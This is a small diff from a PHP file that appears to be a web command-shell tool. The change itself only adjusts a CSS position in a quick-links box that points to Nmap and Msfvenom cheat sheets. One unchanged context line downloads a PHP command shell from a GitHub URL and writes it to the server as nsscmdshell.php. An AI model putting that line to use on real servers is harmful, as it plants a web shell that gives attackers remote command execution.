@@ -112,7 +112,7 @@
             file_put_contents('nsscmdshell.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
             }
         if (isset($_GET['links'])) {
-           echo '<div style="position:absolute;float:right;top:5%;right:5%;text-align:left;">
+           echo '<div style="position:absolute;float:right;top:5%;right:2%;text-align:left;">
             <p>Quick Links:</p>
             <a href="https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf" target="_blank">Nmap Cheat Sheet</a><br>
             <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a><br>
